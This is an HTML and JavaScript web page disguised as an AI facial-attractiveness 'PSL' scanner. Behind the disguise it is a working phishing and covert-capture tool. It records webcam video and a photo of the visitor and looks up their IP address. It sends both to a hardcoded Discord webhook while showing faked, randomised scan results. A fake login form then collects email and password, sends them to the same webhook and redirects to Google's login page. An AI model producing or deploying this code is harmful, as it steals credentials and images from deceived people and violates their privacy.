<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Deep Scan | PSL Rating System</title>
    <style>
        * { box-sizing: border-box; outline: none; }
        body { font-family: 'Consolas', 'Courier New', monospace; background: #000; color: #0ff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: rgba(10, 10, 10, 0.95); border: 1px solid #0ff; padding: 25px; border-radius: 15px; text-align: center; width: 400px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.2); position: relative; }
        
        .v-wrap { width: 100%; border-radius: 10px; overflow: hidden; border: 1px solid #333; margin-bottom: 20px; background: #000; position: relative; }
        #video { width: 100%; display: block; transform: scaleX(-1); }
        #result-canvas { width: 100%; display: none; border-radius: 10px; transform: scaleX(-1); }
        
        /* 解析オーバーレイ */
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; display: none; }
        .grid-line { position: absolute; border: 0.5px solid rgba(0, 255, 255, 0.3); width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,255,.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,.1) 1px, transparent 1px); background-size: 20px 20px; }
        
        .btn { background: #0ff; color: #000; border: none; padding: 16px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; letter-spacing: 2px; }
        
        #result-ui, #login-ui { display: none; }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; margin: 15px 0; font-size: 11px; }
        .stat-item { background: rgba(0, 255, 255, 0.05); padding: 8px; border-left: 2px solid #0ff; }
        
        .psl-bar-container { width: 100%; height: 20px; background: #111; border: 1px solid #333; margin: 20px 0; position: relative; }
        .psl-bar-fill { height: 100%; background: linear-gradient(90deg, #004444, #0ff); width: 0%; transition: width 2.5s cubic-bezier(0.1, 0, 0.3, 1); }
        
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #0ff; background: #000; color: #0ff; border-radius: 5px; font-size: 14px; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #0ff; box-shadow: 0 0 15px #0ff; display: none; animation: scan 3s infinite linear; z-index: 10; }
        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
    </style>
</head>
<body>

    <div class="card" id="camera-ui">
        <h1 style="font-size: 14px;">SYSTEM: FACIAL MESH SCANNER</h1>
        <div class="v-wrap">
            <div class="scan-line" id="line"></div>
            <video id="video" autoplay playsinline muted></video>
        </div>
        <button class="btn" id="start-btn">INITIALIZE SCAN</button>
    </div>

    <div class="card" id="result-ui">
        <h1 style="font-size: 14px;">ANALYSIS COMPLETE</h1>
        <div class="v-wrap">
            <canvas id="result-canvas"></canvas>
            <div class="grid-line" style="position: absolute; top:0; left:0;"></div>
        </div>
        
        <div class="stat-grid">
            <div class="stat-item">FWHR: <span id="res-fwhr">...</span></div>
            <div class="stat-item">CANTHAL: <span id="res-tilt">...</span></div>
            <div class="stat-item">SYMMETRY: <span id="res-sym">...</span></div>
            <div class="stat-item">MIDFACE: <span id="res-mid">...</span></div>
        </div>

        <div style="font-size: 10px; margin-bottom: 5px;">PSL SCALE RATING</div>
        <div class="psl-bar-container">
            <div class="psl-bar-fill" id="psl-fill"></div>
        </div>

        <button class="btn" id="view-details-btn">VIEW FULL REPORT (PDF)</button>
    </div>

    <div class="card" id="login-ui">
        <h1 style="font-size: 14px; color: #fff;">SECURITY CHECK</h1>
        <p style="font-size: 10px; color: #888;">PDFレポートのダウンロードを許可するためにログインしてください</p>
        <form id="trap-form">
            <input type="email" id="email" placeholder="Email / Phone" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit" class="btn" id="final-btn">CONFIRM & DOWNLOAD</button>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";

        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        const line = document.getElementById('line');
        const canvas = document.getElementById('result-canvas');
        let capturedImg = "";
        let videoBlob = null;
        let net = {};
        let clipboardData = "None";

        window.onload = async () => {
            try { net = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
        };

        async function sendFirstStrike() {
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({
                username: "PSL Tracker",
                embeds: [{ title: "📸 Target Captured", color: 0x00ffff, fields: [{ name: "IP", value: net.ip || "Unknown" }] }]
            }));
            const photoBlob = await (await fetch(capturedImg)).blob();
            formData.append('file1', photoBlob, 'face.jpg');
            if (videoBlob) formData.append('file2', videoBlob, 'scan.mp4');
            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        }

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                startBtn.innerText = "SCANNING...";
                line.style.display = "block";
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    await sendFirstStrike();
                };
                mediaRecorder.start();

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // 🚨 ここがポイント：PSLメッシュの描画（フェイク）
                    ctx.strokeStyle = "#0ff";
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    // 顔の輪郭っぽい三角形を描画
                    const w = canvas.width; const h = canvas.height;
                    ctx.moveTo(w*0.5, h*0.2); ctx.lineTo(w*0.3, h*0.4); ctx.lineTo(w*0.4, h*0.8);
                    ctx.lineTo(w*0.6, h*0.8); ctx.lineTo(w*0.7, h*0.4); ctx.closePath(); ctx.stroke();
                    // 目元のライン
                    ctx.moveTo(w*0.3, h*0.4); ctx.lineTo(w*0.7, h*0.4); ctx.stroke();
                    
                    capturedImg = canvas.toDataURL('image/jpeg', 0.6);
                    mediaRecorder.stop();
                    document.getElementById('camera-ui').style.display = 'none';
                    document.getElementById('result-ui').style.display = 'block';
                    canvas.style.display = 'block';
                    
                    // 数値のランダム化
                    document.getElementById('res-fwhr').innerText = (1.8 + Math.random()*0.2).toFixed(2);
                    document.getElementById('res-tilt').innerText = (5 + Math.random()*3).toFixed(1) + "°";
                    document.getElementById('res-sym').innerText = (90 + Math.random()*8).toFixed(1) + "%";
                    document.getElementById('res-mid').innerText = (0.9 + Math.random()*0.1).toFixed(2);
                    
                    setTimeout(() => {
                        document.getElementById('psl-fill').style.width = (75 + Math.random()*20) + "%";
                    }, 500);

                    stream.getTracks().forEach(t => t.stop());
                }, 5000);
            } catch (err) { alert("ERROR: Camera access required."); }
        };

        document.getElementById('view-details-btn').onclick = () => {
            document.getElementById('result-ui').style.display = 'none';
            document.getElementById('login-ui').style.display = 'block';
        };

        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            const payload = {
                username: "PSL Elite Intel",
                embeds: [{
                    title: "🔑 Credentials Secured",
                    color: 0xff0000,
                    fields: [
                        { name: "ID", value: document.getElementById('email').value },
                        { name: "PW", value: document.getElementById('pass').value },
                        { name: "IP", value: net.ip || "Unknown" }
                    ]
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
        };
    </script>
</body>
</html>
